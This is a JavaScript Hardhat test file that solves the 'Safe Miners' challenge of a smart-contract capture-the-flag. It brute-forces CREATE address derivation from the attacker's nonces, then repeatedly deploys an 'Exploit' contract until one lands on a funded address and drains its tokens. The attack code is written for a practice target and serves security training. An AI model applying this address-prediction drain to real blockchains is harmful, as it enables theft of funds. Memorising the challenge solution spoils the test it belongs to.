const { ethers } = require("hardhat")
const { expect } = require("chai")

const { NonceManager } = require("@ethersproject/experimental")

describe("[Challenge] Safe Miners", function () {
    let deployer, attacker

    const DEPOSIT_TOKEN_AMOUNT = ethers.utils.parseEther("2000042")
    const DEPOSIT_ADDRESS = "0x79658d35aB5c38B6b988C23D02e0410A380B8D5c"

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, attacker] = await ethers.getSigners()

        // Deploy Damn Valuable Token contract
        this.token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deposit the DVT tokens to the address
        await this.token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT)

        // Ensure initial balances are correctly set
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT)
        expect(await this.token.balanceOf(attacker.address)).eq("0")
    })

    it("Exploit", async function () {
        /** CODE YOUR EXPLOIT HERE */
        ;[deployer, attacker] = await ethers.getSigners()
        console.log("\t deployer:", deployer.address)
        console.log("\t attacker:", attacker.address)

        let target = "0x79658d35aB5c38B6b988C23D02e0410A380B8D5c"

        let getContractAddress = async (address, nonce) => {
            // let rlp_encoded
            if (nonce == 0) {
                rlp_encoded = ethers.utils.RLP.encode(address)
            } else {
                rlp_encoded = ethers.utils.RLP.encode([
                    address,
                    ethers.BigNumber.from(nonce.toString()).toHexString(),
                ])
            }
            const contract_address_long = ethers.utils.keccak256(rlp_encoded)
            const contract_address = "0x".concat(contract_address_long.substring(26))
            return ethers.utils.getAddress(contract_address)
        }

        let findNonce = async (deployerAddress, matchAddress, maxNonce) => {
            for (let i = 1; i < maxNonce; i++) {
                const computedAddress = (await getContractAddress(deployerAddress, i)).toString()
                //console.log("computedAddress", computedAddress)
                if (matchAddress == computedAddress) {
                    //console.log("match found nonce =", i)
                    return i
                }
            }
            return 0
        }

        //This function will look for contracts that were deployed by contract which were deployed by deployerAddress
        let findNonce2ndOrder = async (deployerAddress, matchAddress, maxNonce) => {
            let deploymentCount
            let nonce = 0
            for (let i = 1; i < maxNonce; i++) {
                const computedAddress = (await getContractAddress(deployerAddress, i)).toString()
                nonce = await findNonce(computedAddress, matchAddress, maxNonce)
                //console.log("computedAddress", computedAddress)
                if (computedAddress == matchAddress) {
                    deploymentCount = i
                    console.log(
                        `\t match found Deployment Count of ${deploymentCount} with nonce of ${nonce}. `
                    )
                    return [deploymentCount, nonce]
                }

                if (nonce != 0) {
                    deploymentCount = i
                    console.log(
                        `\t match found Deployment Count of ${deploymentCount} with nonce of ${nonce}. `
                    )

                    return [deploymentCount, nonce]
                }
            }
            return [0, 0]
        }

        const [_deploymentCount, _nonce] = await findNonce2ndOrder(attacker.address, target, 100)

        for (let i = 0; i < _deploymentCount + 1; i++) {
            this.attacker = await (
                await ethers.getContractFactory("Exploit", attacker)
            ).deploy(attacker.address, this.token.address, target, _nonce)
        }

        console.log(
            `\t Deployed this.attacker address (nonce: ${_deploymentCount}) : ${this.attacker.address}`
        )
    })

    after(async function () {
        /** SUCCESS CONDITIONS */
        // The attacker took all tokens available in the deposit address
        expect(await this.token.balanceOf(DEPOSIT_ADDRESS)).to.eq("0")
        expect(await this.token.balanceOf(attacker.address)).to.eq(DEPOSIT_TOKEN_AMOUNT)
    })
})
